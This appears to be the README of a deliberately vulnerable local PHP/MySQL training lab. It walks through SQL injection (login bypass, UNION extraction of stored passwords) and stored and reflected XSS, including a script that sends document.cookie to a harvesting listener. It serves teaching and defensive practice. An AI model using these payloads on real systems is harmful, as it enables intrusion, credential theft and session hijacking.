# SQL Injection Test Lab

## 1. Database Setup

Before running the application, you need to configure the database.

1.  **Create and Seed the Database**:
    Run the `db_schema.sql` script to create the `sql_injection_lab` database and populate it with test data.
    
    You can do this via the command line (assuming you have the `mysql` client installed):
    ```bash
    mysql -u root -p < db_schema.sql
    ```
    *Enter your MySQL password when prompted.*

2.  **Configure Credentials**:
    Open `config.php` and update the database connection settings if they differ from your local setup:
    -   **DB_HOST**: `127.0.0.1`
    -   **DB_PORT**: `3307` (Default is often 3306, check your MySQL server)
    -   **DB_USER**: `root`
    -   **DB_PASS**: `root`

## 2. Start the Server

Once the database is ready, you can start the PHP built-in server.

1.  **Run the Server**:
    Execute the following command in the project root directory:
    ```bash
    php -S localhost:8000
    ```

2.  **Access the Application**:
    Open your web browser and navigate to:
    [http://localhost:8000](http://localhost:8000)

## Troubleshooting
-   If you see a "Connection failed" error, double-check your credentials in `config.php` and ensure your MySQL server is running.
-   If the port `8000` is already in use, try a different port (e.g., `php -S localhost:8080`).


## 2. SQL Injection Testing Guide

This guide will help you test the vulnerabilities intentionally built into the project.

> [!WARNING]
> Use these techniques ONLY on this educational project. Attempting these on real-world sites without permission is illegal.

## 1. Authentication Bypass (index.php)

The goal here is to log in without knowing the password.

### Concept
The query looks like this:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

We want to make the `WHERE` clause always return `TRUE`.

### The Attack
1. Go to the login page.
2. In the **Username** field, enter:
   ```text
   admin' OR '1'='1
   ```
3. Leave the **Password** field empty (or type anything).
4. Click **Authenticate**.

<img width="1247" height="649" alt="image" src="https://github.com/user-attachments/assets/14eccb65-0e6b-4c38-b00f-e780d77f084d" />


### What Happens?
The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
```
Since `'1'='1'` is always true, the database returns the first user found (usually the admin), and you are logged in!

---

## 2. Reading Hidden Data (songs.php)

The goal here is to extract usernames and passwords from the `users` table while we are supposed to be looking at `songs`.

### Concept
The query looks like this:
```sql
SELECT id, title, description, artist FROM songs WHERE id = $id
```
We can use the `UNION` operator to combine the results of the original query with a new query of our choice.

### Step 1: Determine Column Count
We need to know how many columns the original `SELECT` has. We can guess by trying:
- `1 UNION SELECT 1` (Error)
- `1 UNION SELECT 1,2` (Error)
- `1 UNION SELECT 1,2,3` (Error)
- `1 UNION SELECT 1,2,3,4` (Success! No error means there are 4 columns)

### Step 2: Extract User Data
Now that we know there are 4 columns, we can craft a query to select data from the `users` table.
The `users` table has columns: `id`, `username`, `password`.

**Copy and paste this exact payload into the Song ID input:**
```text
-1 UNION SELECT 1, username, password, 4 FROM users
```

### What Happens?
The query becomes:
```sql
SELECT id, title, description, artist FROM songs WHERE id = -1 UNION SELECT 1, username, password, 4 FROM users
```
1. We use `-1` for the song ID so the first part of the query returns nothing (there is no song with ID -1).
2. The `UNION` operator appends the results from your injected query (the `users` table).
3. The application displays the results:
    - **Title** column now shows the **username**.
    - **Description** column now shows the **password**.

    <img width="1247" height="649" alt="image" src="https://github.com/user-attachments/assets/7304527c-87f3-41be-8604-743616072f70" />


## 3. Advanced: Dump Database Version

You can also find out the database version.
Try entering:
```text
-1 UNION SELECT 1, @@version, database(), 4
```

This will show the database version in the Title column and the database name in the Description column.

---

# Module 2: Cross-Site Scripting (XSS)

The goal of this module is to understand Stored XSS, where a malicious script is saved to the database and executed whenever a user views the affected page.

> [!NOTE]
> Ensure you are on the **Guestbook (XSS)** page (`xss.php`).

## 1. Basic Verification (The Alert)

The simplest way to test for XSS is to try to pop up an alert box.

1.  Enter any **Name** (e.g., `Hacker`).
2.  In the **Message** box, enter the following payload:
    ```html
    <script>alert('XSS Vulnerability found!')</script>
    ```
3.  Click **Sign Guestbook**.
4.  **Result**: As soon as the page reloads, the script stored in the database executes, and you should see a browser alert saying "XSS Vulnerability found!". Every time you (or anyone else) visits this page, the alert will trigger.
5.  *Cleanup*: Click the **Delete** button next to your post to remove the annoyance.

## 2. Advanced: Data Harvesting (Cookie/IP Stealing)

Real attackers don't just annoy users with alerts; they steal data. We have set up a listener script (`harvest.php`) to capture this data.

### Concept
We will inject a script that makes a background request to our listener (`harvest.php`), sending it sensitive info like the user's IP address or cookies.

### The Attack Workflow
1.  **Prepare the Payload**:
    We want to trigger a fetch request to `harvest.php`.
    ```html
    <script>
      fetch('harvest.php?data=' + encodeURIComponent(document.cookie) + '&location=' + window.location.href);
    </script>
    ```
    *Note: Since this is a local lab, your cookies might be empty or just PHPSESSID, but the principle remains the same.*

2.  **Execute the Attack**:
    - Go to `xss.php`.
    - In the **Message** field, paste the script above.
    - Click **Sign Guestbook**.

3.  **Verify the theft**:
    - The page will reload. You won't see an alert, but the browser has silently sent a request to `harvest.php`.
    - Now, we need to check if the attacker received the data.
    - You can check the database directly using SQL:
      ```bash
      mysql -u root -p -e "SELECT * FROM xss_logs" sql_injection_lab
      ```
    - OR (if you want to implement a viewer page later) just check the table manually.

    You should see a new entry in `xss_logs` containing the captured headers, IP, and any data passed in the URL.

### 3. Impact Analysis
If an administrator views this Guestbook page while logged in, their session cookies would be sent to the attacker. The attacker could then use those cookies to hijack the administrator's session.
<img width="1247" height="649" alt="image" src="https://github.com/user-attachments/assets/b9e53ac9-be4a-4578-a245-5957f18510fd" />

---

# Module 3: Reflected XSS (URL Attacks)

In Reflected XSS, the malicious script is not stored in the database. Instead, it is embedded in the URL itself. The server reflects this script back to the user who clicks the link.

> [!NOTE]
> Ensure you are on the **URL Attack (Reflected XSS)** page (`xss-url.php`).

## 1. Using the Attack Generator

We have built a tool to help you craft these malicious URLs.

1.  **Select a Payload**:
    -   Click the **Load Harvester Payload** button. This will insert the code to steal data and send it to `harvest.php`.
    -   *Alternative*: Type `<script>alert(1)</script>` for a simple test.

2.  **Generate the Link**:
    -   Click **Generate Attack URL**.
    -   A long, complex-looking URL will appear below. This URL contains your encoded script.

## 2. The "Phishing" Simulation

To understand how this attack works in the real world, you need to simulate sending this link to a victim.

1.  **Copy the Generated Link**.
2.  **Open a New Browser Window** (or an Incognito/Private window).
    -   This simulates a different user (the victim) clicking the link you sent them (e.g., via email or chat).
3.  **Paste and Go**:
    -   Paste the link into the address bar.
    -   Notice that the pageloads and the script executes immediately (e.g., you see the alert or the data is sent).

## 3. Verify Data Theft
If you used the Harvester Payload:
1.  Go back to your terminal.
2.  Check the logs:
    ```bash
    mysql -u root -p -e "SELECT * FROM xss_logs ORDER BY id DESC LIMIT 1" sql_injection_lab
    ```
3.  You should see the IP address and cookies of the "victim" browser (the Incognito window).
<img width="1247" height="649" alt="image" src="https://github.com/user-attachments/assets/fa4bc96f-bb24-4bc3-b24c-b065213ad471" />


## Summary
-   **Stored XSS**: Attack code is on the server (Guestbook). Hits everyone who visits.
-   **Reflected XSS**: Attack code is in the URL. Hits only people who click YOUR specific link.
